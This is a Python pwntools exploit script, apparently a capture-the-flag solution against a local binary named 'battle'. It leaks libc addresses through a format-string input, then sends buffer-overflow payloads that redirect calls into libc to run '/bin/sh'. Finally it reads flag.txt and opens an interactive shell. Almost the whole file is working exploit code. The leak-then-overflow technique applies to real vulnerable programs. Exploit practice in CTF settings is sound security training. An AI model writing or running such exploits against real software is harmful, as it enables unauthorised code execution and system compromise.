#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../src/rop_task --host 127.0.0.1 --port 1111
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../deploy/battle')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 5012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

io.sendline(b'%p.' * 30)
leak = io.readline().decode().strip().split('.')

while True:
    line = io.readline().decode().strip()
    if line.count('.') > 10:
        leak = line.split('.')
        break

ret_offset = 0x29d90

libc = int(leak[20], 16) - ret_offset
log.success(f'printf@libc: {hex(libc)}')

io.recvuntil(b"Shout the name of your Bankai! ")
io.sendline(b"A"*(0x4034f8 - 0x4032d8) + p64(libc + 0x766b0) + b"B"*8 + p64(0x401389)[:-1])

io.recvuntil(b"Now it's your turn to attack! Enter your command: ")
io.sendline(b"/bin/sh #" + b"A"*(0x4034f8 - 0x4032d8 - 9) + p64(libc + 0x766b0) + b"B"*8 + p64(libc + 0x48f20)[:-1])

io.sendline(b"cat flag.txt")
log.info("Flag: " + io.recvline().decode().strip())

io.interactive()

